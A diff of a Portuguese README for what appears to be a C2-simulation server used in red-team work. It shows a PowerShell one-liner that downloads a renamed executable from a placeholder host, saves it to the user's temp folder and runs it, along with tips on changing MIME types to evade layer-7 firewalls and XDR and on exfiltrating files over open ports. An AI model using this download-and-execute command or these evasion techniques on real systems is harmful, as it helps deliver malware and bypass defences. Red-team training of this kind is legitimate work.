@@ -70,6 +70,7 @@ O servidor pode ser configurado para simular uma infraestrutura de C2, onde malw
 - **Alteração de MIMETYPE**: O script é legível a parte onde ele manipula os MIMETYPES, você pode mudar um arquivo .exe para `text/html`, tentando burlar firewall de camada 7 alterando o `Content Type` de resposta do servidor web, assim podendo burlar algum firewall que tenham brechas em suas regras.
 
 - **Alteração de Portas**: Podemos rapidamente alterar *as portas* e a *pasta de execução*, para executar operações de Exfiltration de arquivos usando portas liberadas para comunicação, bem como uma torre de liberação de payloads binários, alterando os tipo de MIME para tentar burlar soluções XDR ou firewalls de camada 7, Exemplo para rodar em clientes: `iwr "http://servidor.local/malware.txt" -OutF "$env:LOCALAPPDATA\temp\malware.exe" & Start-Process "$env:LOCALAPPDATA\temp\malware.exe"`
+Explicação do comando:
 ````
 iwr = invoke-webrequest
 http://servidor.local/malware.txt = servidor interno, com o .exe alterado para .txt
@@ -77,7 +78,6 @@ http://servidor.local/malware.txt = servidor interno, com o .exe alterado para .
 "$env:LOCALAPPDATA\temp\malware.exe" = pasta temp do usuário que está rodando a sessão, arquivo salvo com a extensão correta.
 Start-Process "$env:LOCALAPPDATA\temp\malware.exe" = Execução do Arquivo logo em seguida.
 ````
-## Estrutura Técnica do Servidor
 
 ### Requisitos
 
